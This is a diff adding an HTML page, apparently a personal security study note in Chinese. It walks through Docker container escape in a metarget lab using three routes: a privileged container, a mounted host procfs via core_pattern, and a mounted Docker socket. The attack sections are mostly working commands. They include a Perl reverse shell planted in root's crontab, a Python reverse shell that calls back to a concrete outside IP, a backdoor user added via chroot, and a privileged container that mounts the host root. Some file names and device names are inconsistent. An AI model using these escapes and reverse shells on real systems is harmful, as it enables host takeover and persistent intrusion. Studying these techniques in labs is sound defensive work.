@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Docker容器逃逸 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/notebook/">
+          <a href="/notebook/">学习笔记</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Docker容器逃逸</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-01-11 20:34:55
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="Docker容器逃逸"><a href="#Docker容器逃逸" class="headerlink" title="Docker容器逃逸"></a>Docker容器逃逸</h1><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>使用项目<code>metarget</code> - <code>https://github.com/Metarget/metarget</code>​</p>
+<p>阿里云公开<code>Ubuntu</code>镜像 - <code>ac2-registry.cn-hangzhou.cr.aliyuncs.com/ac2/base:ubuntu22.04</code> - <a target="_blank" rel="noopener" href="https://cr.console.aliyun.com/cn-hangzhou/instances/artifact">https://cr.console.aliyun.com/cn-hangzhou/instances/artifact</a></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120171004-0pz7vqp.png" alt="image-20251120171004-0pz7vqp"></p>
+<p>‍</p>
+<p>容器环境中可能如<code>ping, ifconfig</code>命令无法正常使用，可以上传<code>busybox</code>配合使用</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251121151521-cs1n065.png" alt="image-20251121151521-cs1n065"></p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="Priviliged-特权模式容器逃逸"><a href="#Priviliged-特权模式容器逃逸" class="headerlink" title="Priviliged 特权模式容器逃逸"></a>Priviliged 特权模式容器逃逸</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./metarget gadget install docker --version <span class="number">18.03</span><span class="number">.1</span></span><br><span class="line">./metarget gadget install k8s --version <span class="number">1.16</span><span class="number">.5</span> --domestic</span><br><span class="line">./metarget cnv install privileged-container</span><br></pre></td></tr></table></figure>
+
+<p>编辑 <code>vulns_cn/configs/pods/privileged-container.yaml</code>​</p>
+<p>将<code>Ubuntu</code>镜像改为阿里云的公开镜像 - <code>ac2-registry.cn-hangzhou.cr.aliyuncs.com/ac2/base:ubuntu22.04</code>，可以防止出现网络问题</p>
+<p>然后查看节点状<code>kubectl get pods -n metarget</code>，若为<code>RUNNING</code>，则就可以进入了 - <code>kubectl exec -it -n metarget privileged-container /bin/bash</code>​</p>
+<p>‍</p>
+<h4 id="判断是否为特权模式"><a href="#判断是否为特权模式" class="headerlink" title="判断是否为特权模式"></a>判断是否为特权模式</h4><p>1、是否有权限查看磁盘列表并操作挂载 - <code>fdisk -l</code>​</p>
+<p>2、通过<code>CapEff</code>掩码值判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep CapEff</span><br></pre></td></tr></table></figure>
+
+<p>若掩码值为<code>0000003fffffffff</code>&#x2F;<code>0000001fffffffff</code>，则为特权模式</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120180359-h7qzzxm.png" alt="image-20251120180359-h7qzzxm"></p>
+<p>‍</p>
+<h4 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h4><p>先查看宿主机有哪些块设备</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120181510-ulvgoji.png" alt="image-20251120181510-ulvgoji"></p>
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/partitions</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120181703-ox6s4mx.png" alt="image-20251120181703-ox6s4mx"></p>
+<p>当前容器宿主机块设备为<code>/vda</code>和<code>/vda1</code>​</p>
+<p><code>/dev/vda1</code> - 文件系统</p>
+<p>‍</p>
+<p>特权容器允许执行<code>mount</code> 挂载命令，在容器中临时创建一个文件夹<code>/test</code>，然后将文件系统<code>/dev/vad1</code>挂载到<code>/test</code>上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test</span><br><span class="line">mount /dev/vda1 /test</span><br></pre></td></tr></table></figure>
+
+<p>实现逃逸，特权容器实现逃逸后，以<code>root</code>权限访问宿主机文件</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120182146-ia2s51i.png" alt="image-20251120182146-ia2s51i"></p>
+<p>在宿主机根目录中新建文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /test/attack.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120182532-9wsxw6z.png" alt="image-20251120182532-9wsxw6z"></p>
+<p>‍</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $&#x27;*/1 * * * * perl -e \&#x27;use Socket;$i=&quot;xxx.xx.xx.xxx&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h5 id="添加用户登录"><a href="#添加用户登录" class="headerlink" title="添加用户登录"></a>添加用户登录</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /test adduser test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120220711-2okmyhy.png" alt="image-20251120220711-2okmyhy"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120221148-mcs7hlz.png" alt="image-20251120221148-mcs7hlz"></p>
+<p>‍</p>
+<h5 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h5><p>正常写公钥就行，不多赘述</p>
+<p>‍</p>
+<h3 id="挂载宿主机Procfs系统导致容器逃逸"><a href="#挂载宿主机Procfs系统导致容器逃逸" class="headerlink" title="挂载宿主机Procfs系统导致容器逃逸"></a>挂载宿主机Procfs系统导致容器逃逸</h3><p><code>procfs</code>中的<code>/proc/sys/kernel/core_pattern</code>负责配置进程崩溃时内存转储数据的导出方式</p>
+<p>从<code>2.6.19</code>内核版本开始，<code>Linux</code>支持在<code>/proc/sys/kernel/core_pattern</code>中使用新语法。如果该文件中的首个字符是管道符<code>|</code>，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行</p>
+<h4 id="判断是否挂载Procfs"><a href="#判断是否挂载Procfs" class="headerlink" title="判断是否挂载Procfs"></a>判断是否挂载Procfs</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251121101416-t5vue7m.png" alt="image-20251121101416-t5vue7m"></p>
+<h4 id="逃逸-1"><a href="#逃逸-1" class="headerlink" title="逃逸"></a>逃逸</h4><p>找到<code>docker</code>在当前宿主机的绝对路径</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/mounts | xargs -d &#x27;,&#x27; -n 1 | grep workdir</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251121101635-toa92xo.png" alt="image-20251121101635-toa92xo"></p>
+<p>将<code>/work</code>更换为<code>/merged</code>​</p>
+<p>在容器内向<code>/host-proc/sys/kernel/core_pattern</code>中写入想要执行的恶意逻辑，这里是执行恶意<code>python</code>代码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;|/var/lib/docker/overlay2/e414c33503a4b8e3fc76ea5f59f76878aca38e9b8f58ccfd11d148707c023a47/merged/tmp/.a.py&#x27; &gt; /host-proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>反弹<code>Shell</code>​</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;/tmp/.a.py &lt;&lt; EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/python</span></span><br><span class="line">import os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = &quot;101.42.13.105&quot;</span><br><span class="line">lport = 2333</span><br><span class="line">def main():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), 0)</span><br><span class="line">    os.dup2(s.fileno(), 1)</span><br><span class="line">    os.dup2(s.fileno(), 2)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class="line">    pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">    os.remove(&#x27;/tmp/.x.py&#x27;)</span><br><span class="line">    s.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>给执行权限<code>chmod +x /tmp/.x.py</code>​</p>
+<p>‍</p>
+<p>制作崩溃程序，可以在有<code>gcc</code>的环境中编译好后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; crash.c &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int *a = NULL;</span><br><span class="line">    *a = 1;  // 故意触发段错误</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o crash crash.c</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>运行<code>/tmp/clash</code>后即可反弹<code>shell</code>逃逸</p>
+<p>‍</p>
+<h3 id="挂载Docker-Socket逃逸"><a href="#挂载Docker-Socket逃逸" class="headerlink" title="挂载Docker Socket逃逸"></a>挂载Docker Socket逃逸</h3><p><code>Docker Socket</code>用来与<code>Docker</code>守护进程进行通信。<code>Docker</code>守护进程是<code>Docker</code>引擎的核心组件，负责管理和执行容器。</p>
+<p>可以利用<code>Docker Socket</code>在容器内部创建一个挂载了宿主机根目录的容器实现逃逸</p>
+<p>‍</p>
+<h4 id="判断是否挂载-Docker-Socket"><a href="#判断是否挂载-Docker-Socket" class="headerlink" title="判断是否挂载 Docker Socket"></a>判断是否挂载 Docker Socket</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -lah /var/run/docker.sock</span><br><span class="line">ls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Docker Socket is mounted.&quot; || echo &quot;Docker Socket is not mounted.&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251121130423-96sr8c0.png" alt="image-20251121130423-96sr8c0"></p>
+<p>‍</p>
+<h4 id="逃逸-2"><a href="#逃逸-2" class="headerlink" title="逃逸"></a>逃逸</h4><p>在<code>docker</code>中安装<code>docker</code>，首先换源</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(1) 换清华源</span><br><span class="line">cat &gt; /etc/apt/sources.list &lt;&lt;EOF</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">(2) 换中科大源</span><br><span class="line">sed -i &#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27; /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt update&amp;&amp; apt install -y wget</span><br><span class="line">wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz</span><br><span class="line">tar xf ./docker-17.03.0-ce.tgz</span><br><span class="line">cd docker</span><br><span class="line">chmod +x ./docker</span><br><span class="line">./docker ps //显示正在运行的容器</span><br><span class="line">./docker run -it -v /:/host --privileged --name=sock-test ac2-registry.cn-hangzhou.cr.aliyuncs.com/ac2/base:ubuntu22.04 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>成功逃逸</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251121143854-xnfn0ig.png" alt="image-20251121143854-xnfn0ig"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-01-11 20:34:55
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-text">Docker容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Priviliged-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-text">Priviliged 特权模式容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="toc-text">判断是否为特权模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8"><span class="toc-text">逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-text">添加用户登录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-text">写ssh公钥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BAProcfs%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-text">挂载宿主机Procfs系统导致容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%8C%82%E8%BD%BDProcfs"><span class="toc-text">判断是否挂载Procfs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8-1"><span class="toc-text">逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BDDocker-Socket%E9%80%83%E9%80%B8"><span class="toc-text">挂载Docker Socket逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%8C%82%E8%BD%BD-Docker-Socket"><span class="toc-text">判断是否挂载 Docker Socket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8-2"><span class="toc-text">逃逸</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8 + '&url=' + http%3A%2F%2Fkagty1.github.io%2Fnotebook_posts%2FDocker%25E5%25AE%25B9%25E5%2599%25A8%25E9%2580%2583%25E9%2580%25B8.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/notebook_posts/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
